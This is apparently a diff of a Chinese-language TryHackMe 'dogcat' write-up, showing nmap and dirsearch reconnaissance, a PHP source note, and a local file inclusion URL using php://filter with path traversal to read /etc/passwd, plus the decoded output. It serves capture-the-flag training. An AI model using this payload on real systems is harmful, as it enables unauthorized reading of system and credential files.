@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─# nmap -sV -Pn 10.10.1.149                          
+└─#  nmap -sV -Pn 10.10.1.149                          
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 01:40 EDT
 Nmap scan report for 10.10.1.149
@@ -17,10 +17,10 @@ Nmap done: 1 IP address (1 host up) scanned in 39.93 seconds
 
 ```
 
-#目录爆破，只有cat和dog两个已知文件夹，各有10张图片
+# 目录爆破，只有cat和dog两个已知文件夹，各有10张图片
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u "http://10.10.1.149" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100
+└─#  python3 dirsearch.py -u "http://10.10.1.149" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -92,13 +92,13 @@ PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAg
 </html>
 ```
 
-#源码分析
+# 源码分析
 大概与我们猜想的一致，需要留意``` $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```这行代码，文件后缀其实是可以指定的，不指定默认是```.php```
 
-#构造参数读取/etc/passwd文件
+# 构造参数读取/etc/passwd文件
 ```http://10.10.1.149/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&```
 
-#解密为
+# 解密为
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
